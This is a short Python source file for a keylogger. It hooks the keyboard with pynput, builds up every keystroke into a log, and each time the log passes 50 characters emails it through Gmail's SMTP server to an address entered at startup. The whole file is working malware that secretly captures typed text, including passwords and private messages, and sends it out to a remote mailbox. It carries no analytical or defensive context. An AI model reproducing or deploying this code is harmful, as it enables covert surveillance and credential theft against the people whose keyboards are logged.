import smtplib
from pynput.keyboard import Key, Listener
import getpass

# setup email
email = input('Enter mail: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

# logger
full_log = ''
word = ''
email_char_limit = 50


def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            print(full_log)
            send_mail()
            full_log = ''
    elif key == Key.backspace:
        word = word[:-1]
    elif key == Key.shift_l or key == Key.shift_r:
        return
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False


def send_mail():
    server.sendmail(email, email, full_log)


with Listener(on_press=on_press) as listener:
    listener.join()
